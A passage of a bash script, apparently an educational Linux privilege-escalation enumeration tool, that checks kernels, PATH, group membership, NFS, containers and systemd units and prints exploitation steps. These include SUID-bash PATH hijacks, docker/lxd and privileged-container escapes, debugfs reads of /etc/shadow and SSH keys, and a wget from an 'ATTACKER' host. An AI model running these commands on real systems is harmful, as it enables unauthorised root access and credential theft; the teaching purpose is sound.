        teach "WHAT THIS MEANS:"
        teach "  Kernel 3.x was released 2011-2015 and is no longer maintained."
        teach "  It contains DOZENS of known privilege escalation vulnerabilities."
        teach ""
        teach "COMMON KERNEL 3.x EXPLOITS:"
        teach "  • DirtyCOW (CVE-2016-5195) - Already described above"
        teach "  • Overlayfs (CVE-2015-1328) - Ubuntu specific"
        teach "  • perf_event (CVE-2013-2094) - Affects 3.4 - 3.13"
        teach "  • recvmsg (CVE-2014-0038) - Memory corruption"
        teach "  • futex (CVE-2014-3153) - Towelroot exploit"
        teach ""
        teach "HOW TO FIND EXPLOITS:"
        teach "  1. Check exact version: uname -r"
        teach "  2. Search exploit-db:"
        teach "     searchsploit linux kernel $kernel_version"
        teach "  3. Try automated tools:"
        teach "     https://github.com/mzet-/linux-exploit-suggester"
        teach "     ./linux-exploit-suggester.sh"
        teach "  4. Check specific CVE databases"
        teach ""
        teach "RECOMMENDATION:"
        teach "  Use exploit suggester tools - too many CVEs to check manually"
        log ""
    fi
    
    # === Kernel 2.x ===
    if [ "$major" -eq 2 ]; then
        critical "${WORK}[REQUIRES COMPILATION]${RST} Kernel 2.x - PREHISTORIC kernel - trivial to exploit"
        vuln "Kernel from the stone age - run exploit suggester"
        log ""
        teach "This kernel is from the early 2000s. It predates most modern"
        teach "security features. Almost certainly has dozens of working exploits."
        teach "Use linux-exploit-suggester to find them all."
        log ""
    fi
    
    # === General guidance ===
    log ""
    teach "═══════════════════════════════════════════════════════════════"
    teach "KERNEL EXPLOITATION - GENERAL CONCEPTS"
    teach "═══════════════════════════════════════════════════════════════"
    teach ""
    teach "WHY KERNEL EXPLOITS ARE DIFFERENT:"
    teach ""
    teach "  User-space exploits (sudo, SUID, cron):"
    teach "  • Require specific misconfigurations"
    teach "  • Depend on what's installed"
    teach "  • Can be fixed by admin without reboot"
    teach "  • Different across systems"
    teach ""
    teach "  Kernel exploits:"
    teach "  • Work regardless of system configuration"
    teach "  • Same kernel = same vulnerability across distributions"
    teach "  • Bypass ALL security (SELinux, AppArmor, containers)"
    teach "  • Require reboot to patch (admins delay this)"
    teach "  • Escape containers (containers share host kernel)"
    teach ""
    teach "KERNEL EXPLOIT WORKFLOW:"
    teach ""
    teach "  1. IDENTIFY"
    teach "     • Check kernel version: uname -r"
    teach "     • Note the distribution: cat /etc/os-release"
    teach "     • Check architecture: uname -m"
    teach ""
    teach "  2. SEARCH"
    teach "     • exploit-db: searchsploit linux kernel [version]"
    teach "     • Google: 'linux kernel [version] exploit'"
    teach "     • Exploit suggester: linux-exploit-suggester.sh"
    teach "     • GitHub: Search for CVE numbers"
    teach ""
    teach "  3. DOWNLOAD"
    teach "     • wget/curl to download .c file"
    teach "     • Or git clone the repository"
    teach "     • Read the exploit code (understand what it does)"
    teach ""
    teach "  4. COMPILE"
    teach "     • Check if gcc/make available: which gcc"
    teach "     • Compile: gcc exploit.c -o exploit"
    teach "     • Some need specific flags (read exploit comments)"
    teach "     • If no compiler, compile on similar system and transfer"
    teach ""
    teach "  5. EXECUTE"
    teach "     • chmod +x exploit"
    teach "     • ./exploit"
    teach "     • Many exploits spawn root shell automatically"
    teach "     • Some require additional steps (read the output)"
    teach ""
    teach "TROUBLESHOOTING:"
    teach "  • Exploit doesn't compile:"
    teach "    - Check kernel headers: apt install linux-headers-\$(uname -r)"
    teach "    - Try on matching system and transfer binary"
    teach ""
    teach "  • Exploit crashes:"
    teach "    - Kernel exploits are often unstable"
    teach "    - Try different exploit for same CVE"
    teach "    - Check if kernel is slightly different version"
    teach ""
    teach "  • No root shell:"
    teach "    - Check if ASLR/SMEP/SMAP enabled (harder exploitation)"
    teach "    - Try a different exploit variant"
    teach ""
    teach "CONTAINERS AND KERNEL EXPLOITS:"
    teach "  • Containers (Docker, LXC) share the HOST kernel"
    teach "  • If host kernel is vulnerable, container can escape"
    teach "  • Kernel exploit in container = root on HOST"
    teach "  • This is why kernel patches are critical for containers"
    teach ""
    teach "RECOMMENDED TOOLS:"
    teach "  • linux-exploit-suggester:"
    teach "    https://github.com/mzet-/linux-exploit-suggester"
    teach "  • linux-exploit-suggester-2:"
    teach "    https://github.com/jondonas/linux-exploit-suggester-2"
    teach ""
    info "For comprehensive kernel exploit search, use the tools above"
    log ""
}
# === PATH HIJACKING OPPORTUNITIES ===
enum_path() {
    section "PATH HIJACKING OPPORTUNITIES"
    
    explain_concept "PATH Hijacking" \
        "Programs can call commands using relative paths (e.g., 'ls' instead of '/bin/ls'). The shell searches \$PATH directories in order. If you control an early PATH directory, you control what gets executed." \
        "Lazy coding + SUID binaries = exploitable. Admins write scripts that call 'cat' or 'whoami' without full paths. If that script is SUID or run by cron as root, and you can create a malicious binary earlier in PATH, you win." \
        "Steps:\n  1. Find writable directory in PATH\n  2. Identify SUID binary that calls relative commands\n  3. Create malicious version in writable PATH dir\n  4. Execute SUID binary"
    
    local current_path="$PATH"
    local has_issues=0
    
    info "Current PATH: $current_path"
    
    # First pass - check if there are any issues
    while IFS=: read -r dir; do
        [ -z "$dir" ] && continue
        if [ "$dir" = "." ]; then
            has_issues=1
            break
        fi
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            has_issues=1
            break
        fi
    done <<< "$current_path"
    
    # Only show education if we found issues
    if [ $has_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  PATH HIJACKING - Understanding Command Resolution"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "HOW SHELL FINDS COMMANDS:"
        teach "  You type: ls"
        teach "  Shell searches PATH left-to-right:"
        teach "  /usr/local/bin/ls → /usr/bin/ls → /bin/ls"
        teach "  First match wins, stops searching"
        teach ""
        teach "EXPLOITATION:"
        teach "  If writable directory comes before real binary:"
        teach "  PATH=/tmp:/usr/bin  ← /tmp writable, comes first"
        teach "  Create: /tmp/ls (malicious)"
        teach "  Victim runs 'ls' → executes /tmp/ls as root"
        teach ""
        teach "WHY SUID BINARIES MATTER:"
        teach "  Bad: system(\"ls\")     ← Searches PATH"
        teach "  Good: execve(\"/bin/ls\") ← Absolute path"
        teach ""
        teach "CURRENT DIRECTORY (.) IN PATH:"
        teach "  Extremely dangerous - ANY directory becomes executable"
        teach "  Admin: cd /tmp && sudo script.sh"
        teach "  Your /tmp/command executes as root"
        log ""
    fi
    
    # Enumerate and report issues
    local writable_count=0
    local has_current_dir=0
    
    while IFS=: read -r dir; do
        [ -z "$dir" ] && continue
        
        if [ "$dir" = "." ]; then
            critical "CURRENT DIRECTORY (.) IN PATH"
            has_current_dir=1
            log ""
            teach "EXPLOITATION:"
            teach "  $ cd /tmp"
            teach "  $ cat > ls << 'EOF'"
            teach "  #!/bin/bash"
            teach "  chmod u+s /bin/bash"
            teach "  /bin/ls \"\$@\"  # Call real ls"
            teach "  EOF"
            teach "  $ chmod +x ls"
            teach "  $ # Wait for root to run command calling 'ls'"
            teach "  $ /bin/bash -p  # Root shell"
            log ""
            writable_count=$((writable_count + 1))
            
        elif [ -d "$dir" ] && [ -w "$dir" ]; then
            critical "WRITABLE PATH directory: $dir"
            log ""
            teach "EXPLOITATION:"
            teach "  Create malicious binary matching common command:"
            teach "  $ cat > $dir/whoami << 'EOF'"
            teach "  #!/bin/bash"
            teach "  chmod u+s /bin/bash"
            teach "  /usr/bin/whoami \"\$@\""
            teach "  EOF"
            teach "  $ chmod +x $dir/whoami"
            teach ""
            teach "  Find targets:"
            teach "  find / -perm -4000 2>/dev/null | while read f; do"
            teach "    strings \"\$f\" | grep -v '/' | grep '^[a-z]\\+\$'"
            teach "  done | sort -u"
            log ""
            writable_count=$((writable_count + 1))
        fi
    done <<< "$current_path"
    
    if [ $writable_count -eq 0 ] && [ $has_current_dir -eq 0 ]; then
        ok "No writable directories in PATH"
    fi
}
# === SPECIAL GROUPS ===
enum_groups() {
    section "PRIVILEGED GROUP MEMBERSHIP"
    
    explain_concept "Special Groups" \
        "Certain Linux groups grant powerful capabilities. Membership in these groups can be equivalent to root access." \
        "Groups exist to delegate specific privileges. Docker group = control containers as root. Disk group = read any file. LXD group = create privileged containers. Admins add users for convenience, not realizing the security implications." \
        "Dangerous groups and exploitation:\n  • docker: Mount host filesystem in container\n  • lxd/lxc: Create privileged container\n  • disk: Direct disk access bypasses permissions\n  • video: Capture framebuffer screenshots\n  • sudo: Obvious, but check for NOPASSWD"
    
    local current_groups=$(groups)
    info "Your groups: $current_groups"
    
    # Check for docker group
    if echo "$current_groups" | grep -qw "docker"; then
        vuln "DOCKER GROUP - Instant root: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
        vuln "You are in the DOCKER group!"
        explain_concept "Docker Group Exploitation" \
            "Docker daemon runs as root. Docker group members can execute commands inside containers that run as root and can mount the host filesystem." \
            "This is by design - Docker needs root to manage containers. The security issue is that Docker group = root equivalent, but admins don't realize this when adding users." \
            "Exploitation:\n  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash\n  This:\n    1. Mounts entire host filesystem to /mnt in container\n    2. chroot into /mnt (now you're in host filesystem)\n    3. Running as root inside container = root on host\n  Alternative: docker run -v /etc/shadow:/tmp/shadow alpine cat /tmp/shadow"
    fi
    
    # Check for lxd/lxc group
    if echo "$current_groups" | grep -qE "lxd|lxc"; then
        vuln "LXD/LXC GROUP - Create privileged container for root access"
        vuln "You are in the LXD/LXC group!"
        explain_concept "LXD Group Exploitation" \
            "LXD manages Linux containers. Group members can create privileged containers with security.privileged=true, which disables most isolation." \
            "Similar to Docker - container management needs root. Privileged containers can access host resources directly, including mounting host filesystem with no restrictions." \
            "Exploitation:\n  lxc init ubuntu:18.04 privesc -c security.privileged=true\n  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n  lxc start privesc\n  lxc exec privesc /bin/bash\n  cd /mnt/root/root"
        
        teach "Alternative method if no internet for image download:"
        teach "  1. Build minimal Alpine image on your machine"
        teach "  2. Transfer to target: python3 -m http.server (on attacker)"
        teach "  3. wget http://ATTACKER/alpine.tar.gz"
        teach "  4. lxc image import alpine.tar.gz --alias privesc"
        teach "  5. Follow exploitation steps above"
    fi
    
    # Check for disk group
    if echo "$current_groups" | grep -qw "disk"; then
        critical "DISK GROUP - Read any file: debugfs /dev/sda1"
        vuln "You are in the DISK group!"
        explain_concept "Disk Group Exploitation" \
            "Disk group grants direct access to block devices (/dev/sda, etc). This bypasses all filesystem permissions." \
            "The disk group exists for disk management utilities. Direct disk access means you can read raw disk sectors, bypassing Linux permission checks entirely." \
            "Exploitation:\n  debugfs /dev/sda1 (interactive disk editor)\n  debugfs: cat /etc/shadow\n  Or: dd if=/dev/sda of=/tmp/disk.img (copy entire disk)\n  Or: Use debugfs to read /root/.ssh/id_rsa"
    fi
    
    # Check for video group
    if echo "$current_groups" | grep -qw "video"; then
        warn "You are in the VIDEO group"
        teach "Video group can access framebuffer devices"
        teach "  Capture screenshots of root user sessions: cat /dev/fb0 > screenshot.raw"
        teach "  May reveal passwords being typed, sensitive information"
    fi
    
    # Check for adm group
    if echo "$current_groups" | grep -qw "adm"; then
        info "You are in the ADM group"
        teach "Adm group can read most log files in /var/log"
        teach "  Useful for password hunting, finding misconfigurations"
        teach "  Check auth.log, apache logs, application logs for secrets"
    fi
}

# === NFS EXPORTS ===
enum_nfs() {
    section "NFS EXPORT ANALYSIS"
    
    if [ ! -f /etc/exports ]; then
        ok "No NFS exports configured"
        return
    fi
    
    explain_concept "NFS no_root_squash" \
        "NFS (Network File System) shares directories over network. 'no_root_squash' means root on client = root on server." \
        "By default, NFS 'squashes' root UID to nobody for security. But 'no_root_squash' disables this. If you can mount the share, you can create files as root on the server." \
        "Exploitation:\n  1. Mount the NFS share: mount -t nfs server:/share /mnt\n  2. Create SUID binary: cp /bin/bash /mnt/bash; chmod +s /mnt/bash\n  3. On server, this bash is now SUID root\n  4. Execute: /share/bash -p"
    
    grep -v "^#" /etc/exports 2>/dev/null | grep -v "^$" | while read line; do
        info "NFS export: $line"
        
        if echo "$line" | grep -q "no_root_squash"; then
            critical "NFS no_root_squash - Mount from another machine as root"
            vuln "NFS export has 'no_root_squash': $line"
            teach "If you can access this from another machine as root, you gain root on this system"
        fi
        
        if echo "$line" | grep -qE "rw|no_all_squash"; then
            warn "NFS export is writable or doesn't squash all UIDs"
        fi
    done
}

# === CONTAINER ESCAPE ===
enum_container() {
    section "CONTAINER DETECTION & ESCAPE"
    
    explain_concept "Container Environments" \
        "Containers isolate processes but share the host kernel. Misconfigurations or vulnerabilities can allow escape to host." \
        "Containers use namespaces and cgroups for isolation. If privileged, mounted with host volumes, or on vulnerable Docker, you may escape. Containers are NOT VMs - same kernel as host." \
        "Common escape vectors:\n  • Privileged container (--privileged flag)\n  • Docker socket mounted inside\n  • Host filesystem mounted\n  • Kernel exploits (affects host)\n  • CAP_SYS_ADMIN capability\n  • Misconfigured cgroups\n  • Shared PID namespace"
    
    local in_container=0
    local container_type=""
    
    # Check if running in container
    if [ -f /.dockerenv ]; then
        in_container=1
        container_type="Docker"
        warn "Running inside a DOCKER container"
        
        # Check .dockerenv contents (sometimes contains info)
        if [ -s /.dockerenv ]; then
            info "/.dockerenv is not empty:"
            cat /.dockerenv 2>/dev/null
        fi
        
    elif [ -f /run/.containerenv ]; then
        in_container=1
        container_type="Podman"
        warn "Running inside a PODMAN container"
        
    elif grep -qa container=lxc /proc/1/environ 2>/dev/null; then
        in_container=1
        container_type="LXC"
        warn "Running inside an LXC container"
        
    elif [ -d /proc/vz ] && [ ! -d /proc/bc ]; then
        in_container=1
        container_type="OpenVZ"
        warn "Running inside OpenVZ container"
    fi
    
    if [ $in_container -eq 0 ]; then
        ok "Not in a detected container environment"
        return
    fi
    
    # Detailed container analysis
    info "Container type detected: $container_type"
    
    # === CHECK 1: Privileged Container ===
    info "Checking if container is privileged..."
    if ip link add dummy0 type dummy 2>/dev/null; then
        ip link delete dummy0 2>/dev/null
        critical "PRIVILEGED CONTAINER - Full host access possible"
        vuln "Container is PRIVILEGED!"
        explain_concept "Privileged Container Escape" \
            "Privileged containers have almost all capabilities and can access host devices." \
            "The --privileged flag disables most security features. It's used for nested Docker, device access, etc. But it allows mounting host filesystem and accessing host resources." \
            "Exploitation:\n  1. List host disks: fdisk -l\n  2. Mount host root: mkdir /mnt/host && mount /dev/sda1 /mnt/host\n  3. Chroot to host: chroot /mnt/host /bin/bash\n  4. Alternative: Access /dev/mem or /dev/kmem for direct memory access"
        
        teach "Privileged escape steps:"
        teach "  fdisk -l  # Find host disk (usually /dev/sda1 or /dev/vda1)"
        teach "  mkdir /mnt/host"
        teach "  mount /dev/sda1 /mnt/host"
        teach "  chroot /mnt/host /bin/bash"
        teach "  # You're now on the host as root"
    else
        ok "Container is NOT privileged (cannot create network interfaces)"
    fi
    
    # === CHECK 2: Capabilities ===
    info "Checking container capabilities..."
    if command -v capsh >/dev/null 2>&1; then
        local caps=$(capsh --print 2>/dev/null)
        echo "$caps" | grep "Current:" | log
        
        # Check for dangerous capabilities
        if echo "$caps" | grep -q "cap_sys_admin"; then
            critical "CAP_SYS_ADMIN in container - Mount host filesystem or load kernel modules"
            vuln "Container has CAP_SYS_ADMIN!"
            teach "With CAP_SYS_ADMIN you can:"
            teach "  • Mount host filesystems"
            teach "  • Manipulate namespaces"
            teach "  • Potentially escape container"
        fi
        
        if echo "$caps" | grep -q "cap_sys_ptrace"; then
            warn "CAP_SYS_PTRACE - Can debug host processes if PID namespace shared"
        fi
        
        if echo "$caps" | grep -q "cap_dac_override"; then
            warn "CAP_DAC_OVERRIDE - Can bypass file permissions on mounted volumes"
        fi
    else
        warn "capsh not available - install libcap2-bin to check capabilities"
    fi
    
    # === CHECK 3: Docker Socket ===
    if [ -S /var/run/docker.sock ]; then
        critical "Docker socket MOUNTED - Full container orchestration access"
        vuln "Docker socket is accessible inside container: /var/run/docker.sock"
        explain_concept "Docker Socket Exploitation" \
            "The Docker socket allows full control over the Docker daemon. If mounted inside a container, you can create new containers, access host filesystem, or escape." \
            "Developers mount docker.sock for 'Docker-in-Docker' scenarios or CI/CD. This gives container full control over all containers and the host." \
            "Exploitation:\n  1. Create privileged container: docker run -v /:/host -it alpine chroot /host /bin/bash\n  2. Or exec into existing container as root\n  3. Access host filesystem through new container"
        
        # Check if we can actually use it
        if command -v docker >/dev/null 2>&1; then
            if docker ps 2>/dev/null | grep -q "."; then
                critical "Docker socket is USABLE - Can create escape container"
                teach "Escape command:"
                teach "  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
            fi
        else
            warn "Docker socket present but docker client not installed"
            teach "If you can install or upload docker binary, you can escape"
        fi
    fi
    
    # === CHECK 4: Seccomp Profile ===
    info "Checking seccomp profile..."
    if [ -f /proc/self/status ]; then
        local seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | awk '{print $2}')
        case "$seccomp" in
            0)
                warn "Seccomp: DISABLED - No syscall filtering (dangerous for host)"
                teach "No seccomp means you can make any syscall"
                ;;
            1)
                ok "Seccomp: STRICT - Very restrictive"
                ;;
            2)
                info "Seccomp: FILTER - Default Docker profile active"
                ok "Standard syscall filtering in place"
                ;;
            *)
                info "Seccomp: UNKNOWN ($seccomp)"
                ;;
        esac
    fi
    
    # === CHECK 5: AppArmor/SELinux ===
    info "Checking container MAC (Mandatory Access Control)..."
    if [ -f /proc/self/attr/current ]; then
        local mac_profile=$(cat /proc/self/attr/current 2>/dev/null)
        if [ -n "$mac_profile" ] && [ "$mac_profile" != "unconfined" ]; then
            info "MAC profile: $mac_profile"
            ok "Container has MAC restrictions"
        else
            warn "MAC: unconfined - No AppArmor/SELinux restrictions"
            teach "Unconfined = easier to exploit misconfigurations"
        fi
    fi
    
    # === CHECK 6: PID Namespace ===
    info "Checking PID namespace isolation..."
    local host_pid_count=$(ps aux 2>/dev/null | wc -l)
    
    if [ $host_pid_count -gt 50 ]; then
        critical "PID namespace likely SHARED - Can see host processes"
        vuln "Can see $host_pid_count processes - likely host PID namespace"
        teach "Shared PID namespace means:"
        teach "  • You can see all host processes"
        teach "  • With CAP_SYS_PTRACE you can attach to them"
        teach "  • Look for sensitive processes: ps aux | grep -E 'ssh|su|sudo'"
    else
        ok "PID namespace appears isolated (only $host_pid_count processes visible)"
    fi
    
    # === CHECK 7: Cgroup Analysis ===
    info "Analyzing cgroup configuration..."
    if [ -f /proc/1/cgroup ]; then
        cat /proc/1/cgroup | while read line; do
            log "  $line"
        done
        
        # Check if cgroup is writable (release_agent exploit)
        if [ -w /sys/fs/cgroup ]; then
            critical "cgroup filesystem is WRITABLE - release_agent exploit possible"
            vuln "/sys/fs/cgroup is writable!"
            teach "Cgroup release_agent escape:"
            teach "  1. Write malicious script to host-accessible path"
            teach "  2. Configure release_agent to execute it"
            teach "  3. Trigger cgroup cleanup"
            teach "  PoC: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
        fi
    fi
    
    # === CHECK 8: Mounted Filesystems ===
    info "Checking for suspicious mounts..."
    mount | grep -vE "^(proc|tmpfs|devpts|sysfs|cgroup)" | while read line; do
        log "  $line"
        
        # Check for host filesystem mounts
        if echo "$line" | grep -qE "on / type|on /host|on /mnt"; then
            warn "Potential host filesystem mount detected"
        fi
        
        # Check for writable host paths
        local mount_point=$(echo "$line" | awk '{print $3}')
        if [ -w "$mount_point" ] && [ "$mount_point" != "/tmp" ] && [ "$mount_point" != "/dev/shm" ]; then
            vuln "Writable mount from host: $mount_point"
            teach "Check if this is a host directory - you may be able to modify host files"
        fi
    done
    
    # === CHECK 9: Kernel Version ===
    info "Kernel version (shared with host): $(uname -r)"
    teach "Since containers share the host kernel, kernel exploits affect the host"
    teach "Check enum_kernel() section for kernel-specific exploits"
    
    # === CHECK 10: Network Mode ===
    info "Checking network mode..."
    if ip addr | grep -q "docker0\|eth0"; then
        info "Container has network access"
        
        # Check if can reach host
        local host_gateway=$(ip route | grep default | awk '{print $3}')
        if [ -n "$host_gateway" ]; then
            info "Host gateway: $host_gateway"
            teach "Scan host from container: nmap $host_gateway"
            teach "Host may have services only accessible from inside"
        fi
    fi
    
    if ip addr | grep -q "host"; then
        warn "Container might be using host networking (--net=host)"
        teach "Host networking = no network isolation"
    fi
    
    # === Summary ===
    log ""
    info "Container escape strategy summary:"
    teach "1. If privileged: Mount host disk and chroot"
    teach "2. If docker.sock: Create escape container"
    teach "3. If CAP_SYS_ADMIN: Mount host filesystem"
    teach "4. If shared PID + CAP_SYS_PTRACE: Inject into host process"
    teach "5. If writable cgroups: release_agent exploit"
    teach "6. Check for kernel exploits (affects host)"
    teach "7. If mounted host paths: Modify sensitive files (.ssh/authorized_keys)"
}

# === SYSTEMD SERVICE & TIMER ANALYSIS ===
enum_systemd() {
    section "SYSTEMD SERVICE & TIMER ANALYSIS"
    
    # Quick check if systemd is even present
    if ! command -v systemctl >/dev/null 2>&1; then
        ok "Systemd not present (using SysV init or other system)"
        return
    fi
    
    # === PHASE 1: SILENT SCAN - Collect all findings ===
    local found_issues=0
    local temp_writable_services="/tmp/.learnpeas_systemd_services_$$"
    local temp_writable_scripts="/tmp/.learnpeas_systemd_scripts_$$"
    local temp_writable_timers="/tmp/.learnpeas_systemd_timers_$$"
    local temp_relative_paths="/tmp/.learnpeas_systemd_relative_$$"
    local temp_restart_services="/tmp/.learnpeas_systemd_restart_$$"
    local temp_env_files="/tmp/.learnpeas_systemd_env_$$"
    local temp_writable_dirs="/tmp/.learnpeas_systemd_dirs_$$"
    local temp_seen_services="/tmp/.learnpeas_systemd_seen_$$"
    
    # Cleanup function
    cleanup_systemd_temps() {
        rm -f "$temp_writable_services" "$temp_writable_scripts" "$temp_writable_timers" \
              "$temp_relative_paths" "$temp_restart_services" "$temp_env_files" \
              "$temp_writable_dirs" "$temp_seen_services" 2>/dev/null
    }
    trap cleanup_systemd_temps RETURN
    
    # Common service locations
    local service_dirs=("/etc/systemd/system" "/lib/systemd/system" "/usr/lib/systemd/system" "/run/systemd/system")
    
    # Whitelist of known-safe systemd binaries (not exploitable via PATH hijacking)
    local safe_binaries=(
        "systemctl" "journalctl" "systemd-" "udevadm" "loginctl" "timedatectl"
        "hostnamectl" "localectl" "busctl" "coredumpctl" "networkctl"
        "resolvectl" "bootctl" "machinectl" "portablectl" "userdbctl"
        "homectl" "oomctl" "systemd-analyze" "systemd-cgls" "systemd-cgtop"
        "systemd-delta" "systemd-detect-virt" "systemd-escape" "systemd-path"
        "systemd-run" "systemd-socket-activate" "systemd-stdio-bridge"
        "rm" "mv" "cp" "cat" "echo" "bash" "sh" "true" "false"
        "grep" "sed" "awk" "find" "chmod" "chown" "mkdir" "touch"
        "ssh-keygen" "grub-editenv"
    )
    
    # === CHECK 1: Writable Service Directories ===
    for service_dir in "${service_dirs[@]}"; do
        if [ -d "$service_dir" ] && [ -w "$service_dir" ]; then
            echo "$service_dir" >> "$temp_writable_dirs"
            found_issues=1
        fi
    done
    
    # === CHECK 2: Writable Service Files (with deduplication) ===
    for service_dir in "${service_dirs[@]}"; do
        [ ! -d "$service_dir" ] && continue
        
        find "$service_dir" -name "*.service" -type f 2>/dev/null | while read service_file; do
            # Skip if it's a symlink (common in systemd)
            [ -L "$service_file" ] && continue
            
            # Deduplicate by service name (avoid /lib and /usr/lib duplicates)
            local service_name=$(basename "$service_file")
            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
                continue
            fi
            echo "$service_name" >> "$temp_seen_services"
            
            if [ -w "$service_file" ]; then
                # Check if service runs as root
                local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
                if [ -z "$user" ] || [ "$user" = "root" ]; then
                    echo "$service_file|root|$service_name" >> "$temp_writable_services"
                    found_issues=1
                else
                    echo "$service_file|$user|$service_name" >> "$temp_writable_services"
                fi
            fi
        done
    done
    
    # === CHECK 3: Services with Writable ExecStart Scripts ===
    > "$temp_seen_services"  # Reset for script check
    
    for service_dir in "${service_dirs[@]}"; do
        [ ! -d "$service_dir" ] && continue
        
        find "$service_dir" -name "*.service" -type f -readable 2>/dev/null | while read service_file; do
            local service_name=$(basename "$service_file")
            
            # Deduplicate
            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
                continue
            fi
            echo "$service_name" >> "$temp_seen_services"
            
            # Extract ExecStart line
            grep "^ExecStart=" "$service_file" 2>/dev/null | while read exec_line; do
                # Extract the script/binary path (remove flags like - + @)
                local script_path=$(echo "$exec_line" | sed 's/ExecStart=//' | sed 's/^[-+@]*//' | awk '{print $1}')
                
                # Skip if empty or doesn't exist
                [ -z "$script_path" ] || [ ! -e "$script_path" ] && continue
                
                # Check if writable
                if [ -w "$script_path" ]; then
                    # Check if service runs as root
                    local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
                    if [ -z "$user" ] || [ "$user" = "root" ]; then
                        echo "$service_name|$service_file|$script_path" >> "$temp_writable_scripts"
                        found_issues=1
                    fi
                fi
            done
        done
    done
    
    # === CHECK 4: Writable Timer Files (with deduplication) ===
    > "$temp_seen_services"  # Reset
    
    for service_dir in "${service_dirs[@]}"; do
        [ ! -d "$service_dir" ] && continue
        
        find "$service_dir" -name "*.timer" -type f 2>/dev/null | while read timer_file; do
            [ -L "$timer_file" ] && continue
            
            # Deduplicate by timer name
            local timer_name=$(basename "$timer_file")
            if grep -q "^${timer_name}\$" "$temp_seen_services" 2>/dev/null; then
                continue
            fi
            echo "$timer_name" >> "$temp_seen_services"
            
            if [ -w "$timer_file" ]; then
                # Find associated service
                local service_name=$(grep "^Unit=" "$timer_file" 2>/dev/null | cut -d= -f2)
                [ -z "$service_name" ] && service_name=$(basename "$timer_file" .timer).service
                
                # Check timer schedule
                local schedule=$(grep "^OnCalendar=\|^OnBootSec=\|^OnUnitActiveSec=" "$timer_file" 2>/dev/null | head -1)
                
                echo "$timer_file|$service_name|$schedule" >> "$temp_writable_timers"
                found_issues=1
            fi
        done
    done
    
    # === CHECK 5: Services with SUSPICIOUS Relative Paths (improved logic) ===
    > "$temp_seen_services"  # Reset
    
    for service_dir in "${service_dirs[@]}"; do
        [ ! -d "$service_dir" ] && continue
        
        find "$service_dir" -name "*.service" -type f -readable 2>/dev/null | while read service_file; do
            local service_name=$(basename "$service_file")
            
            # Deduplicate
            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
                continue
            fi
            echo "$service_name" >> "$temp_seen_services"
            
            # Check if service runs as root
            local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
            [ -n "$user" ] && [ "$user" != "root" ] && continue
            
            # Look for ExecStart without leading /
            grep "^ExecStart=" "$service_file" 2>/dev/null | while read exec_line; do
                # Skip if it starts with / (absolute path)
                echo "$exec_line" | grep -qE "ExecStart=[-+@]?/" && continue
                
                # Extract binary name (remove flags and arguments)
                local binary=$(echo "$exec_line" | sed 's/ExecStart=//' | sed 's/^[-+@]*//' | awk '{print $1}')
                [ -z "$binary" ] && continue
                
                # Check if binary is in the safe list
                local is_safe=0
                for safe in "${safe_binaries[@]}"; do
                    if [[ "$binary" == "$safe"* ]]; then
                        is_safe=1
                        break
                    fi
                done
                
                # Only flag if NOT in safe list
                if [ $is_safe -eq 0 ]; then
                    # Additional check: does the binary exist in standard paths?
                    if ! command -v "$binary" >/dev/null 2>&1; then
                        # Binary doesn't exist in PATH - THIS is suspicious
                        echo "$service_file|$exec_line|$binary|NOTFOUND" >> "$temp_relative_paths"
                        found_issues=1
                    else
                        # Binary exists but uses relative path - lower severity
                        local binary_path=$(command -v "$binary" 2>/dev/null)
                        if [ -w "$binary_path" ] 2>/dev/null; then
                            # The actual binary is writable - flag this
                            echo "$service_file|$exec_line|$binary|WRITABLE:$binary_path" >> "$temp_relative_paths"
                            found_issues=1
                        fi
                    fi
                fi
            done
        done
    done
    
    # === CHECK 6: Services with Restart=always (more exploitation chances) ===
    > "$temp_seen_services"  # Reset
    
    for service_dir in "${service_dirs[@]}"; do
        [ ! -d "$service_dir" ] && continue
        
        find "$service_dir" -name "*.service" -type f -readable 2>/dev/null | while read service_file; do
            local service_name=$(basename "$service_file")
            
            # Deduplicate
            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
                continue
            fi
            echo "$service_name" >> "$temp_seen_services"
            
            if grep -q "^Restart=always" "$service_file" 2>/dev/null; then
                local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
                if [ -z "$user" ] || [ "$user" = "root" ]; then
                    # Only care if it's enabled
                    if systemctl is-enabled "$service_name" 2>/dev/null | grep -qE "enabled|static"; then
                        echo "$service_file|$service_name" >> "$temp_restart_services"
                    fi
                fi
            fi
        done
    done
    
    # === CHECK 7: Writable EnvironmentFile ===
    > "$temp_seen_services"  # Reset
    
    for service_dir in "${service_dirs[@]}"; do
        [ ! -d "$service_dir" ] && continue
        
        find "$service_dir" -name "*.service" -type f -readable 2>/dev/null | while read service_file; do
            local service_name=$(basename "$service_file")
            
            # Deduplicate
            if grep -q "^${service_name}\$" "$temp_seen_services" 2>/dev/null; then
                continue
            fi
            echo "$service_name" >> "$temp_seen_services"
            
            grep "^EnvironmentFile=" "$service_file" 2>/dev/null | while read env_line; do
                local env_file=$(echo "$env_line" | cut -d= -f2 | sed 's/^-//')  # Remove optional - prefix
                
                if [ -f "$env_file" ] && [ -w "$env_file" ]; then
                    local user=$(grep "^User=" "$service_file" 2>/dev/null | cut -d= -f2)
                    if [ -z "$user" ] || [ "$user" = "root" ]; then
                        echo "$service_file|$service_name|$env_file" >> "$temp_env_files"
                        found_issues=1
                    fi
                fi
            done
        done
    done
    
    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
    if [ $found_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════════╗"
